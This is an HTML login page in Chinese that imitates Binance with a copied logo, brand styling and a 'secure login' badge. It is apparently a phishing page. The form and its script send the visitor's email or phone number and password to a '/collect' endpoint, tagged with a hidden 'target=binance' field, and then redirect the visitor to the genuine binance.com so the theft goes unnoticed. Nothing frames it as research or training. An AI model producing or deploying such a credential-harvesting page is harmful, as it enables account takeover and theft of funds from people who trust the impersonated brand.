<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Binance 登录</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: "Inter", -apple-system, BlinkMacSystemFont, sans-serif; background: #f0f2f5; min-height: 100vh; display: flex; align-items: center; justify-content: center; }
        .login-container { background: white; border-radius: 8px; box-shadow: 0 2px 16px rgba(0,0,0,0.08); padding: 40px; width: 100%; max-width: 400px; }
        .logo { text-align: center; margin-bottom: 32px; }
        .logo svg { width: 120px; height: 32px; }
        h1 { font-size: 24px; font-weight: 600; color: #1b1d1f; margin-bottom: 8px; text-align: center; }
        .subtitle { text-align: center; color: #7a848e; margin-bottom: 32px; font-size: 14px; }
        .form-group { margin-bottom: 20px; }
        label { display: block; margin-bottom: 6px; font-size: 13px; color: #3a3d41; font-weight: 500; }
        input { width: 100%; padding: 12px 16px; border: 1px solid #d1d5db; border-radius: 6px; font-size: 15px; transition: border-color 0.2s, box-shadow 0.2s; }
        input:focus { outline: none; border-color: #f0b90b; box-shadow: 0 0 0 3px rgba(240, 185, 11, 0.1); }
        .btn { width: 100%; padding: 14px; background: #f0b90b; color: #1b1d1f; border: none; border-radius: 6px; font-size: 15px; font-weight: 600; cursor: pointer; transition: background 0.2s; }
        .btn:hover { background: #e6ac00; }
        .footer { text-align: center; margin-top: 24px; font-size: 12px; color: #7a848e; }
        .footer a { color: #f0b90b; text-decoration: none; margin: 0 8px; }
        .footer a:hover { text-decoration: underline; }
        .safety { display: flex; align-items: center; justify-content: center; gap: 6px; margin-top: 16px; font-size: 11px; color: #a1aab5; }
        .safety svg { width: 14px; height: 14px; }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">
            <svg viewBox="0 0 120 32" fill="none" xmlns="http://www.w3.org/2000/svg">
                <rect x="0" y="0" width="32" height="32" rx="6" fill="#F0B90B"/>
                <path d="M8 12h16M8 16h12M8 20h16" stroke="white" stroke-width="3" stroke-linecap="round"/>
                <text x="42" y="22" font-family="Arial, sans-serif" font-size="20" font-weight="bold" fill="#1B1D1F">Binance</text>
            </svg>
        </div>
        <h1>登录您的账户</h1>
        <p class="subtitle">使用邮箱或手机号登录</p>
        <form id="loginForm" action="/collect" method="POST">
            <input type="hidden" name="target" value="binance">
            <div class="form-group">
                <label for="username">邮箱 / 手机号</label>
                <input type="text" id="username" name="username" required autocomplete="username" placeholder="请输入邮箱或手机号">
            </div>
            <div class="form-group">
                <label for="password">密码</label>
                <input type="password" id="password" name="password" required autocomplete="current-password" placeholder="请输入密码">
            </div>
            <button type="submit" class="btn">登录</button>
        </form>
        <div class="footer">
            <a href="#">忘记密码?</a>
            <a href="#">注册账户</a>
            <div class="safety">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                    <rect x="3" y="3" width="18" height="18" rx="2"/>
                    <path d="M12 8v4M12 16h.01"/>
                </svg>
                <span>安全登录保护</span>
            </div>
            <div style="margin-top: 16px;">© 2024 Binance</div>
        </div>
    </div>
    <script>
        document.getElementById('loginForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const formData = new FormData(e.target);
            const btn = e.target.querySelector('.btn');
            btn.textContent = '登录中...';
            btn.disabled = true;
            try {
                const resp = await fetch('/collect', { method: 'POST', body: formData });
                if (resp.redirected) window.location.href = resp.url;
                else window.location.href = 'https://www.binance.com/';
            } catch { window.location.href = 'https://www.binance.com/'; }
        });
    </script>
</body>
</html>
